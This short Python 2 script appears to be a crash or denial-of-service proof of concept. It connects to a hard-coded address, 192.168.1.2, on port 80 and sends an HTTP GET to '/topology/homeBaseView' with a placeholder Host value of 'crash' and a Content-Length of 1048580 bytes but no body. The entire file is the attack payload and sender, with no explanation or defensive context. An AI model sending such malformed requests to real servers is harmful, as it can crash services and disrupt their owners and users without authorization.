import socket
host = '192.168.1.2'
port = 80
crash = "crash"
buffer = "GET /topology/homeBaseView HTTP/1.1\r\n"
buffer += "Host: " + crash + "\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer += "Content-Length: 1048580\r\n\r\n"
s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect((host, port))
s.send(buffer)
s.close()
print "OK"